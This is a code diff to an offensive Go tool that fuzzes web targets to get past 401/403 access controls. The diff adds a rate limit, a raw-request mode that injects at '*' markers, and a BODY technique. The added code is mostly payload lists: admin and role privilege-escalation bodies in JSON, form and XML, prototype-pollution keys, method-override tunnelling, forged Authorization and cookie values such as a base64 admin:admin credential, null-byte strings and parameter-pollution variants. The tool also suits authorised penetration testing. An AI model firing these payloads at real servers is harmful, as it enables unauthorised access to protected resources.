@@ -54,6 +54,7 @@ const (
 	REFERER = "referer"
 	AGENT   = "agent"
 	PARAM   = "param"
+	BODY    = "body"
 	ALL     = "all"
 )
 
@@ -87,12 +88,9 @@ type Config struct {
 	Layer       int
 	Full        bool
 
-	Aggressive           bool
-	MaxMutationsPerSeg   int
-	TraversalDepthPerGap int
-
-	HexMin int
-	HexMax int
+	RPS     int
+	RawFile string
+	Scheme  string
 
 	MatchStatus  []int
 	FilterStatus []int
@@ -124,7 +122,7 @@ func printBanner() {
 func main() {
 	singleURL := flag.String("u", "", "Target URL (or via stdin)")
 	technique := flag.String("t", "",
-		"Techniques (comma-separated): dds,enc,quick,case,headers,rewrite,method,rich,hex,tpl,unicode,cdn,cookie,referer,agent,param,all")
+		"Techniques (comma-separated): dds,enc,quick,case,headers,rewrite,method,rich,hex,tpl,unicode,cdn,cookie,referer,agent,param,body,all")
 	layer    := flag.Int("l", 0, "Path segment layer (1-index, 0=last)")
 	fullFlag := flag.Bool("full", false, "Mutate all path segments")
 
@@ -139,11 +137,9 @@ func main() {
 	allFlag     := flag.Bool("all", false, "Skip initial 401/403 filter")
 	methodFlag  := flag.String("X", "", "HTTP method override")
 	dataFlag    := flag.String("d", "", "Request body")
-	aggr        := flag.Bool("aggr", false, "Aggressive mode (insertions inside segments)")
-	maxseg      := flag.Int("maxseg", 64, "Max mutations per segment")
-	tdepth      := flag.Int("tdepth", 2, "Traversal depth per boundary")
-	hexmin      := flag.Int("hexmin", 0, "Hex fuzz range min (0-255)")
-	hexmax      := flag.Int("hexmax", 255, "Hex fuzz range max (0-255)")
+	rps         := flag.Int("rps", 0, "Rate limit in requests/sec (0 = unlimited)")
+	rawFile     := flag.String("r", "", "Raw HTTP request file (* = injection point)")
+	scheme      := flag.String("scheme", "https", "Scheme for -r mode (http/https)")
 	matchSt     := flag.String("ms", "", "Only show these status codes (comma-separated, e.g. 200,302)")
 	filterSt    := flag.String("fs", "", "Hide these status codes (comma-separated, e.g. 403,404)")
 
@@ -160,46 +156,60 @@ func main() {
 		All:                  *allFlag,
 		Layer:                *layer,
 		Full:                 *fullFlag,
-		Aggressive:           *aggr,
-		MaxMutationsPerSeg:   *maxseg,
-		TraversalDepthPerGap: *tdepth,
-		HexMin:               *hexmin,
-		HexMax:               *hexmax,
-		MatchStatus:          parseIntList(*matchSt),
-		FilterStatus:         parseIntList(*filterSt),
+		RPS:          *rps,
+		RawFile:      *rawFile,
+		Scheme:       *scheme,
+		MatchStatus:  parseIntList(*matchSt),
+		FilterStatus: parseIntList(*filterSt),
 	}
 
 	if *technique == "" {
 		cfg.Techniques = []string{
-			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM,
+			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
 		}
 	} else if strings.EqualFold(*technique, ALL) {
 		cfg.Techniques = []string{
-			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM,
+			DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD, RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
 		}
 	} else {
 		cfg.Techniques = strings.Split(*technique, ",")
 	}
 
 	var urls []string
-	if *singleURL != "" {
-		urls = append(urls, *singleURL)
-	} else {
-		sc := bufio.NewScanner(os.Stdin)
-		for sc.Scan() {
-			if line := strings.TrimSpace(sc.Text()); line != "" {
-				urls = append(urls, line)
+	if cfg.RawFile == "" {
+		if *singleURL != "" {
+			urls = append(urls, *singleURL)
+		} else {
+			sc := bufio.NewScanner(os.Stdin)
+			for sc.Scan() {
+				if line := strings.TrimSpace(sc.Text()); line != "" {
+					urls = append(urls, line)
+				}
 			}
 		}
+		if len(urls) == 0 {
+			fmt.Fprintln(os.Stderr, cBRed+"[!] No URLs provided. Use -u, pipe via stdin, or -r for raw request file."+cReset)
+			os.Exit(1)
+		}
+		cfg.URLs = urls
 	}
-	if len(urls) == 0 {
-		fmt.Fprintln(os.Stderr, cBRed+"[!] No URLs provided. Use -u or pipe via stdin."+cReset)
-		os.Exit(1)
-	}
-	cfg.URLs = urls
 
-	toTest      := filterByInitialCheck(cfg)
-	allPayloads := buildAllRequests(cfg, toTest)
+	var toTest      []string
+	var allPayloads []Payload
+
+	if cfg.RawFile != "" {
+		rr, err := parseRawRequest(cfg.RawFile, cfg.Scheme)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, cBRed+"[!] Error parsing raw request: %v\n"+cReset, err)
+			os.Exit(1)
+		}
+		cfg.URLs = []string{rr.BaseURL()}
+		toTest = filterByInitialCheck(cfg)
+		allPayloads = buildFromRawRequest(rr, cfg)
+	} else {
+		toTest = filterByInitialCheck(cfg)
+		allPayloads = buildAllRequests(cfg, toTest)
+	}
 
 	for i := range allPayloads {
 		if *methodFlag != "" {
@@ -289,11 +299,13 @@ func buildAllRequests(cfg Config, baseURLs []string) []Payload {
 			case METHOD:
 				ps = generateMethodPayloads(parsed)
 			case RICH:
-				ps = wrapPayloads(generateRichBypassPayloads(parsed, cfg), "rich")
+				ps = wrapPayloads(generateRichBypassPayloads(parsed), "rich")
 			case HEX:
-				ps = wrapPayloads(generateHexFuzzPayloads(parsed, cfg), "hex")
+				ps = wrapPayloads(generateHexFuzzPayloads(parsed), "hex")
 			case TPL:
-				ps = wrapPayloads(generateTemplateFuzzPayloads(parsed, cfg), "tpl")
+				ps = wrapPayloads(generateTemplateFuzzPayloads(parsed), "tpl")
+			case BODY:
+				ps = generateBodyPayloads(parsed)
 			case UNICODE:
 				ps = wrapPayloads(generateUnicodePayloads(parsed), "unicode")
 			case CDN:
@@ -309,12 +321,10 @@ func buildAllRequests(cfg Config, baseURLs []string) []Payload {
 			case ALL:
 				for _, t := range []string{
 					DDS, ENC, QUICK, CASE, HEADRS, REWRITE, METHOD,
-					RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM,
+					RICH, HEX, TPL, UNICODE, CDN, COOKIE, REFERER, AGENT, PARAM, BODY,
 				} {
 					sub := buildAllRequests(Config{
-						Layer: cfg.Layer, Full: cfg.Full, Aggressive: cfg.Aggressive,
-						MaxMutationsPerSeg: cfg.MaxMutationsPerSeg, TraversalDepthPerGap: cfg.TraversalDepthPerGap,
-						HexMin: cfg.HexMin, HexMax: cfg.HexMax, Techniques: []string{t},
+						Layer: cfg.Layer, Full: cfg.Full, Techniques: []string{t},
 					}, []string{base})
 					ps = append(ps, sub...)
 				}
@@ -406,6 +416,13 @@ func runTests(payloads []Payload, cfg Config) []Response {
 	sem         := make(chan struct{}, cfg.Concurrency)
 	var wg sync.WaitGroup
 
+	var rateTok <-chan time.Time
+	if cfg.RPS > 0 {
+		t := time.NewTicker(time.Second / time.Duration(cfg.RPS))
+		defer t.Stop()
+		rateTok = t.C
+	}
+
 	for _, p := range payloads {
 		wg.Add(1)
 		sem <- struct{}{}
@@ -413,6 +430,10 @@ func runTests(payloads []Payload, cfg Config) []Response {
 			defer wg.Done()
 			defer func() { <-sem }()
 			defer atomic.AddInt64(&tested, 1)
+
+			if rateTok != nil {
+				<-rateTok
+			}
 
 			method := pl.Method
 			if method == "" {
@@ -1784,7 +1805,7 @@ func generateAgentPayloads(parsedURL *url.URL) []Payload {
 }
 
 // ── RICH: Rich combination of path tricks ─────────────────────────────────────
-func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
+func generateRichBypassPayloads(u *url.URL) []string {
 	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
 	path  := strings.TrimPrefix(u.Path, "/")
 	parts := strings.Split(path, "/")
@@ -1816,12 +1837,9 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 		"..%2f", "%2f..%2f", "/.%2e/", "/%2e%2e/",
 		"..%c0%af", "%252e%252e%252f", "..%5c", "..%255c",
 	}
-	if cfg.TraversalDepthPerGap < 1 {
-		cfg.TraversalDepthPerGap = 1
-	}
 	for gap := 0; gap <= len(parts); gap++ {
 		for _, t := range traversals {
-			for d := 1; d <= cfg.TraversalDepthPerGap; d++ {
+			for d := 1; d <= 2; d++ {
 				token := strings.Repeat(t, d)
 				left  := strings.Join(parts[:gap], "/")
 				right := strings.Join(parts[gap:], "/")
@@ -1878,27 +1896,8 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 			mod[i] = enc
 			addPath(set, base, mod, u.RawQuery)
 			count++
-			if !cfg.Aggressive && count >= cfg.MaxMutationsPerSeg {
+			if count >= 64 {
 				break
-			}
-		}
-
-		if cfg.Aggressive {
-			lim := 0
-			for a := 0; a < len(seg); a++ {
-				for b := a + 1; b < len(seg); b++ {
-					enc    := seg[:a] + hexUpper(seg[a]) + seg[a+1:b] + hexUpper(seg[b]) + seg[b+1:]
-					mod    := append([]string{}, parts...)
-					mod[i] = enc
-					addPath(set, base, mod, u.RawQuery)
-					lim++
-					if lim >= cfg.MaxMutationsPerSeg {
-						break
-					}
-				}
-				if lim >= cfg.MaxMutationsPerSeg {
-					break
-				}
 			}
 		}
 
@@ -1932,24 +1931,14 @@ func generateRichBypassPayloads(u *url.URL, cfg Config) []string {
 }
 
 // ── HEX: %00..%FF injection ───────────────────────────────────────────────────
-func generateHexFuzzPayloads(u *url.URL, cfg Config) []string {
+func generateHexFuzzPayloads(u *url.URL) []string {
 	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
 	path  := strings.TrimPrefix(u.Path, "/")
 	parts := strings.Split(path, "/")
 	set   := make(map[string]struct{}, 1<<15)
 
-	if cfg.HexMin < 0 {
-		cfg.HexMin = 0
-	}
-	if cfg.HexMax > 255 {
-		cfg.HexMax = 255
-	}
-	if cfg.HexMin > cfg.HexMax {
-		cfg.HexMin, cfg.HexMax = 0, 255
-	}
-
-	hexList := make([]string, 0, cfg.HexMax-cfg.HexMin+1)
-	for v := cfg.HexMin; v <= cfg.HexMax; v++ {
+	hexList := make([]string, 0, 256)
+	for v := 0; v <= 255; v++ {
 		hexList = append(hexList, fmt.Sprintf("%%%02X", v))
 	}
 
@@ -1965,24 +1954,6 @@ func generateHexFuzzPayloads(u *url.URL, cfg Config) []string {
 			addPath(set, base, mod, u.RawQuery)
 		}
 
-		if cfg.Aggressive && seg != "" {
-			limit := 0
-			for pos := 0; pos <= len(seg); pos++ {
-				for _, token := range hexList {
-					newSeg := seg[:pos] + token + seg[pos:]
-					mod    := append([]string{}, parts...)
-					mod[i] = newSeg
-					addPath(set, base, mod, u.RawQuery)
-					limit++
-					if limit >= cfg.MaxMutationsPerSeg {
-						break
-					}
-				}
-				if limit >= cfg.MaxMutationsPerSeg {
-					break
-				}
-			}
-		}
 	}
 
 	for i := 0; i < len(parts)-1; i++ {
@@ -2006,7 +1977,7 @@ func generateHexFuzzPayloads(u *url.URL, cfg Config) []string {
 }
 
 // ── TPL: Known template patterns ──────────────────────────────────────────────
-func generateTemplateFuzzPayloads(u *url.URL, cfg Config) []string {
+func generateTemplateFuzzPayloads(u *url.URL) []string {
 	base  := fmt.Sprintf("%s://%s", u.Scheme, u.Host)
 	path  := strings.TrimPrefix(u.Path, "/")
 	parts := strings.Split(path, "/")
@@ -2042,19 +2013,6 @@ func generateTemplateFuzzPayloads(u *url.URL, cfg Config) []string {
 			mod[i] = seg + token
 			addPath(set, base, mod, u.RawQuery)
 
-			if cfg.Aggressive && seg != "" {
-				limit := 0
-				for pos := 0; pos <= len(seg); pos++ {
-					newSeg := seg[:pos] + token + seg[pos:]
-					mod    := append([]string{}, parts...)
-					mod[i] = newSeg
-					addPath(set, base, mod, u.RawQuery)
-					limit++
-					if limit >= cfg.MaxMutationsPerSeg {
-						break
-					}
-				}
-			}
 		}
 	}
 
@@ -2456,4 +2414,450 @@ func percentEncodeCharByChar(s string) []string {
 		variants = append(variants, s[:i]+fmt.Sprintf("%%%02X", s[i])+s[i+1:])
 	}
 	return variants
+}
+
+// ── BODY: body content-based bypass payloads ──────────────────────────────────
+func generateBodyPayloads(u *url.URL) []Payload {
+	base := fmt.Sprintf("%s://%s%s", u.Scheme, u.Host, u.Path)
+	if u.RawQuery != "" {
+		base += "?" + u.RawQuery
+	}
+	var payloads []Payload
+
+	type entry struct{ body, ct string }
+	entries := []entry{
+		// JSON privilege escalation
+		{`{"admin":true}`, "application/json"},
+		{`{"role":"admin"}`, "application/json"},
+		{`{"isAdmin":1,"admin":true}`, "application/json"},
+		{`{"role":"administrator","privilege":"admin"}`, "application/json"},
+		{`{"user":"admin","role":"admin","debug":true}`, "application/json"},
+		{`{"__proto__":{"admin":true}}`, "application/json"},
+		{`{"constructor":{"prototype":{"admin":true}}}`, "application/json"},
+		{`{"role":["admin","user"]}`, "application/json"},
+		{`{"role":null}`, "application/json"},
+		{`{"id":0,"role":"admin"}`, "application/json"},
+		{`{"id":-1}`, "application/json"},
+		{`{"bypass":true,"admin":true}`, "application/json"},
+		// Form body
+		{`admin=true&role=admin`, "application/x-www-form-urlencoded"},
+		{`isAdmin=1`, "application/x-www-form-urlencoded"},
+		{`role=administrator`, "application/x-www-form-urlencoded"},
+		{`debug=true&bypass=1`, "application/x-www-form-urlencoded"},
+		{`admin=1&superuser=true`, "application/x-www-form-urlencoded"},
+		{`role=admin&admin=true&isAdmin=1`, "application/x-www-form-urlencoded"},
+		// XML body
+		{`<?xml version="1.0"?><root><admin>true</admin></root>`, "application/xml"},
+		{`<?xml version="1.0"?><root><role>admin</role></root>`, "application/xml"},
+		{`<?xml version="1.0"?><root><isAdmin>1</isAdmin><role>admin</role></root>`, "application/xml"},
+	}
+	for _, e := range entries {
+		payloads = append(payloads, Payload{
+			URL:          base,
+			Method:       "POST",
+			ExtraHeaders: map[string]string{"Content-Type": e.ct},
+			ExtraInfo:    "body",
+			Data:         e.body,
+		})
+	}
+
+	// Method tunneling via body
+	for _, m := range []struct{ method, ct, body string }{
+		{"POST", "application/x-www-form-urlencoded", "_method=DELETE"},
+		{"POST", "application/x-www-form-urlencoded", "_method=PUT"},
+		{"POST", "application/x-www-form-urlencoded", "X-HTTP-Method-Override=GET"},
+		{"POST", "application/json", `{"_method":"GET"}`},
+		{"POST", "application/json", `{"_method":"DELETE"}`},
+	} {
+		payloads = append(payloads, Payload{
+			URL:          base,
+			Method:       m.method,
+			ExtraHeaders: map[string]string{"Content-Type": m.ct},
+			ExtraInfo:    "body-method",
+			Data:         m.body,
+		})
+	}
+
+	return payloads
+}
+
+// ── Raw HTTP Request support ───────────────────────────────────────────────────
+
+type RawRequest struct {
+	Method      string
+	Path        string
+	RawQuery    string
+	Host        string
+	Headers     map[string]string // lowercase key → value
+	HeaderOrder []string          // original-case keys in declaration order
+	Body        string
+	Scheme      string
+}
+
+func (rr *RawRequest) BaseURL() string {
+	u := fmt.Sprintf("%s://%s%s", rr.Scheme, rr.Host, rr.Path)
+	if rr.RawQuery != "" {
+		u += "?" + rr.RawQuery
+	}
+	return u
+}
+
+func parseRawRequest(filename, scheme string) (*RawRequest, error) {
+	raw, err := os.ReadFile(filename)
+	if err != nil {
+		return nil, fmt.Errorf("cannot read file: %w", err)
+	}
+	content := strings.ReplaceAll(string(raw), "\r\n", "\n")
+	content = strings.ReplaceAll(content, "\r", "\n")
+
+	headerBlock, body, _ := strings.Cut(content, "\n\n")
+	lines := strings.Split(strings.TrimSpace(headerBlock), "\n")
+	if len(lines) == 0 {
+		return nil, fmt.Errorf("empty request file")
+	}
+
+	rr := &RawRequest{
+		Headers: make(map[string]string),
+		Scheme:  scheme,
+		Body:    strings.TrimRight(body, "\n"),
+	}
+
+	// Request line: METHOD /path?query HTTP/1.1
+	reqParts := strings.Fields(lines[0])
+	if len(reqParts) < 2 {
+		return nil, fmt.Errorf("invalid request line: %q", lines[0])
+	}
+	rr.Method = strings.ToUpper(reqParts[0])
+	rawPath := reqParts[1]
+	if idx := strings.Index(rawPath, "?"); idx >= 0 {
+		rr.Path = rawPath[:idx]
+		rr.RawQuery = rawPath[idx+1:]
+	} else {
+		rr.Path = rawPath
+	}
+
+	// Headers
+	for _, line := range lines[1:] {
+		if line == "" {
+			break
+		}
+		idx := strings.Index(line, ":")
+		if idx < 0 {
+			continue
+		}
+		origKey := strings.TrimSpace(line[:idx])
+		val := strings.TrimSpace(line[idx+1:])
+		lk := strings.ToLower(origKey)
+		rr.Headers[lk] = val
+		rr.HeaderOrder = append(rr.HeaderOrder, origKey)
+		if lk == "host" {
+			rr.Host = val
+		}
+	}
+
+	if rr.Host == "" {
+		return nil, fmt.Errorf("no Host header in raw request file")
+	}
+	return rr, nil
+}
+
+// rrPayload creates a Payload from a RawRequest, carrying all non-star headers.
+func rrPayload(rr *RawRequest, u, tag, data string) Payload {
+	p := Payload{
+		URL:          u,
+		Method:       rr.Method,
+		ExtraHeaders: make(map[string]string),
+		ExtraInfo:    tag,
+		Data:         data,
+	}
+	for _, origKey := range rr.HeaderOrder {
+		lk := strings.ToLower(origKey)
+		val := rr.Headers[lk]
+		if strings.Contains(val, "*") {
+			continue // star headers handled separately
+		}
+		if lk == "host" || lk == "user-agent" || lk == "content-length" {
+			continue
+		}
+		p.ExtraHeaders[origKey] = val
+	}
+	return p
+}
+
+// buildFromRawRequest produces all bypass payloads from a parsed raw request.
+// When * appears in path/query/body/headers, only those positions are fuzzed.
+// Without *, all configured techniques run against the full URL with raw headers injected.
+func buildFromRawRequest(rr *RawRequest, cfg Config) []Payload {
+	baseURL := rr.BaseURL()
+
+	pathHasStar  := strings.Contains(rr.Path, "*")
+	queryHasStar := strings.Contains(rr.RawQuery, "*")
+	bodyHasStar  := strings.Contains(rr.Body, "*")
+
+	var headerStarKeys []string
+	for _, origKey := range rr.HeaderOrder {
+		lk := strings.ToLower(origKey)
+		if strings.Contains(rr.Headers[lk], "*") {
+			headerStarKeys = append(headerStarKeys, origKey)
+		}
+	}
+
+	hasStar := pathHasStar || queryHasStar || bodyHasStar || len(headerStarKeys) > 0
+
+	if !hasStar {
+		// No injection point: apply all techniques to the base URL, injecting raw headers.
+		ps := buildAllRequests(cfg, []string{baseURL})
+		for i := range ps {
+			for _, origKey := range rr.HeaderOrder {
+				lk := strings.ToLower(origKey)
+				if lk == "host" || lk == "user-agent" || lk == "content-length" {
+					continue
+				}
+				if _, exists := ps[i].ExtraHeaders[origKey]; !exists {
+					ps[i].ExtraHeaders[origKey] = rr.Headers[lk]
+				}
+			}
+			if ps[i].Data == "" && rr.Body != "" {
+				ps[i].Data = rr.Body
+			}
+			if ps[i].Method == "GET" && rr.Method != "" && rr.Method != "GET" {
+				ps[i].Method = rr.Method
+			}
+		}
+		return ps
+	}
+
+	var payloads []Payload
+
+	if pathHasStar {
+		parts := strings.Split(strings.TrimPrefix(rr.Path, "/"), "/")
+		for i, seg := range parts {
+			if strings.Contains(seg, "*") {
+				payloads = append(payloads, rawPathStarPayloads(rr, parts, i)...)
+				break
+			}
+		}
+	}
+	if queryHasStar {
+		payloads = append(payloads, rawQueryStarPayloads(rr)...)
+	}
+	if bodyHasStar {
+		payloads = append(payloads, rawBodyStarPayloads(rr, rr.Headers["content-type"])...)
+	}
+	for _, origKey := range headerStarKeys {
+		payloads = append(payloads, rawHeaderStarPayloads(rr, origKey)...)
+	}
+
+	return removeDuplicatePayloads(payloads)
+}
+
+// rawPathStarPayloads applies DDS/ENC/QUICK path bypass at the * segment.
+func rawPathStarPayloads(rr *RawRequest, pathParts []string, starIdx int) []Payload {
+	cleanParts := make([]string, len(pathParts))
+	copy(cleanParts, pathParts)
+	cleanParts[starIdx] = strings.ReplaceAll(cleanParts[starIdx], "*", "x")
+
+	cleanURL := fmt.Sprintf("%s://%s/%s", rr.Scheme, rr.Host, strings.Join(cleanParts, "/"))
+	if rr.RawQuery != "" {
+		cleanURL += "?" + rr.RawQuery
+	}
+	parsed, err := url.Parse(cleanURL)
+	if err != nil {
+		return nil
+	}
+
+	layer := starIdx + 1
+	var urls []string
+	urls = append(urls, generateDDSPayloads(parsed, layer, false)...)
+	urls = append(urls, generateEncodingPayloads(parsed, layer, false)...)
+	urls = append(urls, generateQuickPayloads(parsed)...)
+	urls = append(urls, generateCasePayloads(parsed, layer, false)...)
+
+	payloads := make([]Payload, 0, len(urls))
+	for _, u := range urls {
+		payloads = append(payloads, rrPayload(rr, u, "raw/path", rr.Body))
+	}
+	return payloads
+}
+
+// rawQueryStarPayloads generates bypass values for the query param containing *.
+func rawQueryStarPayloads(rr *RawRequest) []Payload {
+	parsed, err := url.Parse(rr.BaseURL())
+	if err != nil {
+		return nil
+	}
+	params, _ := url.ParseQuery(rr.RawQuery)
+
+	var starKey string
+	for k, vals := range params {
+		if len(vals) > 0 && strings.Contains(vals[0], "*") {
+			starKey = k
+			break
+		}
+	}
+	if starKey == "" {
+		return nil
+	}
+
+	base := fmt.Sprintf("%s://%s%s", parsed.Scheme, parsed.Host, parsed.Path)
+	set := make(map[string]struct{})
+
+	for _, bv := range []string{
+		"admin", "root", "administrator", "superuser",
+		"1", "0", "-1", "true", "false", "null", "undefined",
+		"*", "%2a", ".*", "admin%00", "%00admin",
+		`{"role":"admin"}`, "2147483647", "-2147483648",
+		"00000000-0000-0000-0000-000000000000",
+	} {
+		v := make(url.Values)
+		for k, vals := range params {
+			v[k] = vals
+		}
+		v.Set(starKey, bv)
+		set[base+"?"+v.Encode()] = struct{}{}
+	}
+	// HPP duplicates
+	for _, bv := range []string{"admin", "1", "true", "null"} {
+		set[base+"?"+rr.RawQuery+"&"+url.QueryEscape(starKey)+"="+url.QueryEscape(bv)] = struct{}{}
+		set[base+"?"+url.QueryEscape(starKey)+"="+url.QueryEscape(bv)+"&"+rr.RawQuery] = struct{}{}
+	}
+
+	payloads := make([]Payload, 0, len(set))
+	for u := range set {
+		payloads = append(payloads, rrPayload(rr, u, "raw/query", rr.Body))
+	}
+	return payloads
+}
+
+// rawBodyStarPayloads replaces * in the body with format-appropriate bypass values.
+func rawBodyStarPayloads(rr *RawRequest, contentType string) []Payload {
+	baseURL := rr.BaseURL()
+	tpl := rr.Body
+	ct := strings.ToLower(contentType)
+
+	var mutations []string
+	switch {
+	case strings.Contains(ct, "application/json"):
+		mutations = jsonBodyValues()
+	case strings.Contains(ct, "xml"):
+		mutations = xmlBodyValues()
+	case strings.Contains(ct, "form"):
+		mutations = formBodyValues()
+	default:
+		trimmed := strings.TrimSpace(tpl)
+		if strings.HasPrefix(trimmed, "{") || strings.HasPrefix(trimmed, "[") {
+			mutations = jsonBodyValues()
+		} else if strings.HasPrefix(trimmed, "<") {
+			mutations = xmlBodyValues()
+		} else {
+			mutations = formBodyValues()
+		}
+	}
+
+	seen := make(map[string]struct{})
+	var payloads []Payload
+
+	for _, bv := range mutations {
+		newBody := strings.ReplaceAll(tpl, "*", bv)
+		if _, dup := seen[newBody]; dup {
+			continue
+		}
+		seen[newBody] = struct{}{}
+		payloads = append(payloads, rrPayload(rr, baseURL, "raw/body", newBody))
+	}
+
+	// JSON extra-field injection: append admin fields before last }
+	isJSON := strings.Contains(ct, "json") ||
+		strings.HasPrefix(strings.TrimSpace(strings.ReplaceAll(tpl, "*", "")), "{")
+	if isJSON {
+		trimmed := strings.TrimSpace(strings.ReplaceAll(tpl, "*", ""))
+		if idx := strings.LastIndex(trimmed, "}"); idx >= 0 {
+			for _, field := range []string{
+				`"admin":true`, `"isAdmin":1`, `"role":"admin"`,
+				`"privilege":"admin"`, `"superuser":true`, `"debug":true`,
+			} {
+				injected := trimmed[:idx] + `,` + field + `}`
+				if _, dup := seen[injected]; !dup {
+					seen[injected] = struct{}{}
+					payloads = append(payloads, rrPayload(rr, baseURL, "raw/body-inject", injected))
+				}
+			}
+		}
+	}
+
+	return payloads
+}
+
+// rawHeaderStarPayloads replaces * in a header value with bypass values.
+func rawHeaderStarPayloads(rr *RawRequest, headerKey string) []Payload {
+	baseURL := rr.BaseURL()
+	lk := strings.ToLower(headerKey)
+	origVal := rr.Headers[lk]
+
+	var bvals []string
+	switch {
+	case strings.Contains(lk, "authorization"):
+		bvals = []string{
+			"", "null", "none",
+			"Bearer admin", "Bearer null",
+			"Bearer " + strings.Repeat("a", 32),
+			"Basic YWRtaW46YWRtaW4=", "Basic YWRtaW46", "Basic Og==",
+			"Token admin", "Token null",
+			"admin", "bypass",
+		}
+	case strings.Contains(lk, "cookie"):
+		bvals = []string{
+			"", "null", "undefined", "admin",
+			"session=admin", "role=admin", "auth=bypass",
+			"1", "0", "true", "false",
+		}
+	default:
+		bvals = []string{
+			"", "null", "undefined", "bypass",
+			"admin", "root", "1", "0", "true", "false",
+			"*", "%2a", "localhost", "127.0.0.1",
+		}
+	}
+
+	payloads := make([]Payload, 0, len(bvals))
+	for _, bv := range bvals {
+		newVal := strings.ReplaceAll(origVal, "*", bv)
+		p := rrPayload(rr, baseURL, "raw/header", rr.Body)
+		p.ExtraHeaders[headerKey] = newVal
+		payloads = append(payloads, p)
+	}
+	return payloads
+}
+
+func jsonBodyValues() []string {
+	return []string{
+		"admin", "administrator", "root", "superuser",
+		"true", "false", "null",
+		"1", "0", "-1", "2147483647",
+		`["admin"]`, `["user","admin"]`,
+		`{"role":"admin"}`,
+		`admin`, `admin`,
+		" admin", "\tadmin", "admin%00",
+	}
+}
+
+func xmlBodyValues() []string {
+	return []string{
+		"admin", "administrator", "root",
+		"true", "1", "0",
+		"<![CDATA[admin]]>",
+		"admin<!--bypass-->",
+		"&amp;admin",
+		" admin",
+	}
+}
+
+func formBodyValues() []string {
+	return []string{
+		"admin", "administrator", "root", "superuser",
+		"1", "0", "-1", "true", "false", "null",
+		"admin%00", "%00admin",
+		`{"role":"admin"}`,
+		"*", "%2a", ".*",
+	}
 }
